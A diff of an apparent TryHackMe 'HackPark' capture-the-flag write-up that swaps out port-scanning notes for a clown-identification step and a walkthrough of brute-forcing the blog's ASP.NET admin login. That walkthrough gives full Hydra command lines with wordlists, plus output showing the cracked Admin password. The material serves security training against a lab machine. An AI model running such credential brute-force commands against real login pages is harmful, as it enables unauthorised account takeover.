@@ -7,112 +7,53 @@
 	
 ## [Task 1] Deploy the vulnerable Windows machine
 
-### Deploy the machine and access its web server.
+On browsing to the home page, we see a clown.
 
-Hit the Deploy button.
+I ran the image through an image search engine, [TinyEye](https://tinyeye.com).
 
-In this write-up, the hostname `target.thm` will be used where appropriate. This can be set in `/etc/hosts` file if you're unfamiliar.
-
-Navigate to the server IP via FireFox. This fails, so lets run an `nmap` scan, and find what port the web-server is running on.
-
-
-#### Nmap
-
-After figuring that the box _isn't_ broken by reading the blurb, I saw that the box doesn't respond to ICMP packets.
-
-##### No response to initial ping
-So, of course, the initial `ping` failed.
-```
-$ ping target.thm
-PING target.thm (10.10.49.211) 56(84) bytes of data.
-^C
---- target.thm ping statistics ---
-8 packets transmitted, 0 received, 100% packet loss, time 7147ms
-```
-
-##### No response to initial nmap
-As such, we need to tailor our `nmap` scan to assume the host _is_ alive, despite no response. This can be done with the `-Pn` flag. 
-```
-$ nmap -sV -sC -Pn target.thm
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 18:20 EDT
-Nmap scan report for target.thm (10.10.49.211)
-Host is up.
-All 1000 scanned ports on target.thm (10.10.49.211) are filtered
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 202.72 seconds
-
-```
-However, it seems the most popular ports aren't open. And after running a number of different nmap variations, I switched to `masscan` for better performance.
-
-##### Masscan returns something!
-
-I switched to `masscan` because I had no luck with `nmap`. This reveals port `993` as being open.
-
-```
-kali@kali:~/Documents/ctf/try-hack-me/hack-park$ sudo masscan 10.10.49.211 --ports 0-65535 --rate 1000 
-
-Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-09-14 23:44:08 GMT
- -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-Initiating SYN Stealth Scan
-Scanning 1 hosts [65536 ports/host]
-Discovered open port 993/tcp on 10.10.49.211                                   
-```
-
-##### Enumerated an `imaps`
-
-```
-kali@kali:~/Documents/ctf/try-hack-me/hack-park$ nmap target.thm -p 993 -Pn -A
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 19:48 EDT
-Nmap scan report for target.thm (10.10.49.211)
-Host is up.
-
-PORT    STATE    SERVICE VERSION
-993/tcp filtered imaps
-```
-
-##### Second masscan returns something else
-But, after realising I couldn't access 993; I ran a second `masscan` scan: 
-```
-kali@kali:~/Documents/ctf/try-hack-me/hack-park$ sudo masscan 10.10.49.211 --ports 0-65535 --rate 1000 -sS -Pn
-
-Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-09-14 23:53:26 GMT
- -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-Initiating SYN Stealth Scan
-Scanning 1 hosts [65536 ports/host]
-Discovered open port 143/tcp on 10.10.49.211                                   
-```
-
-##### Enumerated an `imap`
-Which revealed `143/tcp`, a less secure `imap`...
-```
-kali@kali:~/Documents/ctf/try-hack-me/hack-park$ nmap -Pn -p 143 -A target.thm
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 19:58 EDT
-Nmap scan report for target.thm (10.10.49.211)
-Host is up.
-
-PORT    STATE    SERVICE VERSION
-143/tcp filtered imap
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 3.26 seconds
-
-```
-
-
-
-#### Navigating to `http://target.thm:143`
-
-
-
-
-
-
-### Whats the name of the clown displayed on the homepage? 
+And eventually found the clown's name on an article from [Slate](https://slate.com/culture/2016/10/evil-clowns-have-been-sighted-all-over-america-since-1981.html).
 
 ## [Task 2] Using Hydra to brute-force a login
 
-_TBA_
+The login area is accessible from the sidebar. 
+
+`http://10.10.136.50/Account/login.aspx?ReturnURL=/admin/`
+
+Here there is `POST` form taking input params:
+
+```
+ctl00$MainContent$LoginUser$UserName: USERNAME
+ctl00$MainContent$LoginUser$Password: PASSWORD
+ctl00$MainContent$LoginUser$LoginButton: Log+in
+```
+
+We can attack this form with Hydra. 
+
+```shell
+hydra -l username -P passwords.txt IP.ADD.RE.SS http-port-form
+```
+
+Prior to initiating an attack, I found user `Admin` from a post on the blog: `http://10.10.136.50/author/Admin`. Though, notably, there is another user on the blog that had left a comment on `Admin`'s post, `Visitor1`. First we'll run hydra against `Admin`, however.
+
+```console
+kali@kali:~$ hydra -l Admin -P /usr/share/wordlists/fasttrack.txt 10.10.136.50 http-post-form "/Account/login.aspx:ctl00\$MainContent\$LoginUser\$UserName=^USER^&ctl00\$MainContent\$LoginUser\$Password=^PASS^&ctl00\$MainContent\$LoginUser\$LoginButton=Log+in:S=302" -v -I
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-19 17:51:10
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking http-post-form://10.10.136.50:80/Account/login.aspx:ctl00$MainContent$LoginUser$UserName=^USER^&ctl00$MainContent$LoginUser$Password=^PASS^&ctl00$MainContent$LoginUser$LoginButton=Log+in:S=302
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[80][http-post-form] host: 10.10.136.50   login: Admin   password: secuirty3
+[STATUS] attack finished for 10.10.136.50 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-19 17:51:13
+```
+
+
+```shell
+hydra -f -l admin -P /data/src/wordlists/rockyou.txt 10.10.136.50 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=nbWrkCqQ%2B1Hn%2Fgt8OwrXb%2B%2BFMX0bVJv9xbWiO3oASE6l0%2BDl73MXEP2ao2pwbsK6Jr4MzOI9cbeVU7o5WL%2BFKDPWl1RXjt5kLGmi%2F1d9biM%2Fi3jThbmDihH1A7JWIVyWFQ3lIXAOLpqdlBKHFv6dZd8XzdjcN%2FrgmGzhog7Sf0Ml3kvolr3pzU9VlhHtBqJZNJ%2FkQVxtOT%2Bc%2FxMceQklmwd%2FeiI1sb4%2B4Mv4ol44Uy4Mf9Vaw%2B6OUiBt1BZn8PQoOcFS6ul97keSrPf2jTIqUqeC1YQwwE0FU7Syl8jfviP6nsNb4aSX6ASTDZlajXjkTtFum%2Bpk3uz4%2FtNoraPjA%2FTn5DuX56Sbr4I9oGPQznIuhjc0&__EVENTVALIDATION=pKMn8W0WIp7BuOhOq9YO49%2BqkAVDl1TJjXzk%2BDzHnOyizFWE7BYkR%2Frn983R5edqA0yBYDn%2Fi7BIxrq%2FJlxoiMHPZ2UN1iFWs83YOrgnVHxJtr4R811S4kAhpj4kb6aqZ1r9F5iqUqIoj3gfQjf%2BtO7mRTdLARthnldxPEA73U3caeMM&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+```
 
 ## [Task 3] Compromise the machine
 
